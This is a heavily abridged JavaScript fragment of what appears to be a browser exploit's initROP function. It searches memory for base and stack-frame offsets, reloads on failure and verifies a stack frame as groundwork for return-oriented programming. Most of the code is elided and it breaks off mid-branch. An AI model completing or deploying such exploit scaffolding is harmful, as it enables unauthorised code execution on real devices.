...
function initROP()
{
	try
	{
		...
		//alert(search_base_offset.toString(16));
		...
		//search_base_offset=base_fp_addr-0x60000;
		do
		{
			if(search_max_threshold<search_range_size){
			if(total_loops<max_loops){reloadInitROP();}
		...
		//search_base_offset=stack_frame_addr+0x20000;
		do
		{
			if(search_max_threshold<search_range_size){
			if(total_loops<max_loops){reloadInitROP();}
		...
		//search_base_offset=stack_frame_addr-0x100000;
		do
		{
			if(search_max_threshold<search_range_size){
			if(total_loops<max_loops){reloadInitROP();}
		...
		if (verify_offsets)
		{
			...
			if(verify_stackframe)
			{
				...
				//stk=checkMemory(stack_frame_addr-0x4,stack_frame.length,stack_frame_addr.length,6);
			}
			else
			{
